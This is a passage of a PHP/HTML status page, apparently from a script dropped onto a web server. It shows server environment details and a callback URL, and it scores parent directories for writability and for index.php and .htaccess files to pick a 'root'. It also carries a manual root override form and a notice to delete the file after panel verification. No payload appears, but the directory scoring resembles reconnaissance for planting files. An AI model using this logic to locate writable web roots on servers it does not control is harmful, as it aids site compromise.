      <tr><td class="lb">CMS</td><td><?php echo htmlspecialchars(isset($_vRI['cms']) ? $_vRI['cms'] : 'None'); ?></td></tr>
      <tr><td class="lb">Markers</td><td style="font-size:11px"><?php echo htmlspecialchars(implode(', ', isset($_vRI['markers']) ? $_vRI['markers'] : []) ?: '—'); ?></td></tr>
      <tr><td class="lb">Path Keyword</td><td><?php echo !empty($_vRI['kw']) ? '<code>'.htmlspecialchars($_vRI['kw']).'</code>' : '—'; ?></td></tr>
    </table>
  </div>

  <div class="box">
    <h2>Server Environment</h2>
    <table>
      <tr><td class="lb">URL</td><td><code><?php echo htmlspecialchars($_vUrl); ?></code></td></tr>
      <tr><td class="lb">Script Dir</td><td><code><?php echo htmlspecialchars($_vStart); ?></code></td></tr>
      <tr><td class="lb">DOCUMENT_ROOT</td><td><code><?php echo htmlspecialchars(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'not set'); ?></code></td></tr>
      <tr><td class="lb">OS / PHP</td><td><?php echo htmlspecialchars(PHP_OS); ?> / <?php echo htmlspecialchars(phpversion()); ?></td></tr>
      <tr><td class="lb">Callback URL</td><td><code style="word-break:break-all"><?php echo htmlspecialchars($_vApiUrl); ?></code></td></tr>
      <tr><td class="lb">cURL</td><td><?php echo function_exists('curl_init') ? '<span class="ok">&#10003; Available</span>' : '<span class="er">&#10007; Not available</span>'; ?></td></tr>
      <tr><td class="lb">allow_url_fopen</td><td><?php echo ini_get('allow_url_fopen') ? '<span class="ok">&#10003; On</span>' : '<span class="er">&#10007; Off</span>'; ?></td></tr>
      <tr><td class="lb">Lock file</td><td><code><?php echo htmlspecialchars($_vCb['lock_file']); ?></code></td></tr>
      <tr><td class="lb">JSON endpoint</td><td><a href="?json" style="color:#4488cc;font-size:11px"><?php echo htmlspecialchars($_vUrl.'?json'); ?></a></td></tr>
    </table>
  </div>

  <div class="box full">
    <h2>Directory Walk — <?php echo count($_vWalk); ?> levels scanned</h2>
    <div style="overflow-x:auto"><table>
      <tr><th>Level</th><th>Path</th><th>Write</th><th>index.php</th><th>.htaccess</th><th>Score</th><th>Markers</th><th>CMS</th></tr>
      <?php foreach ($_vWalk as $wl): $ir = ($wl['path'] === $_vRP); ?>
      <tr <?php if ($ir) echo 'class="hl"'; ?>>
        <td><?php echo $ir ? '<strong>&#8593;'.$wl['level'].' &#9733;</strong>' : '&#8593;'.$wl['level']; ?></td>
        <td><code><?php echo htmlspecialchars($wl['path']); ?></code></td>
        <td><?php echo $wl['write'] ? '<span class="ok">&#10003;</span>' : '<span class="er">&#10007;</span>'; ?></td>
        <td><?php echo $wl['idx']   ? '<span class="ok">&#10003;</span>' : '<span class="er">&#10007;</span>'; ?></td>
        <td><?php echo $wl['hta']   ? '<span class="ok">&#10003;</span>' : '<span class="er">&#10007;</span>'; ?></td>
        <td style="color:#45a29e"><?php echo $wl['score']; ?></td>
        <td style="font-size:11px"><?php echo htmlspecialchars(implode(', ', $wl['markers']) ?: '—'); ?></td>
        <td style="font-size:11px"><?php echo htmlspecialchars($wl['cms']); ?></td>
      </tr>
      <?php endforeach; ?>
    </table></div>
    <p style="font-size:11px;color:#333;margin-top:7px">&#9733; = selected root &bull; Score = markers×3 + path-keyword(2) + CMS(2)</p>
  </div>

  <div class="box full">
    <h2>Manual Root Override</h2>
    <form method="GET"><input type="text" name="root" value="<?php echo htmlspecialchars(isset($_GET['root']) ? $_GET['root'] : ''); ?>" placeholder="/var/www/html  or  C:\inetpub\wwwroot"><button type="submit">Re-scan</button></form>
  </div>

  <div class="box full notice">
    <strong style="color:#66fcf1">Keep this file accessible until verification shows success in the panel.</strong>
    <span style="font-size:12px;color:#444;margin-top:4px;display:block">Delete it after verification is confirmed.</span>
  </div>

</div>
</body></html>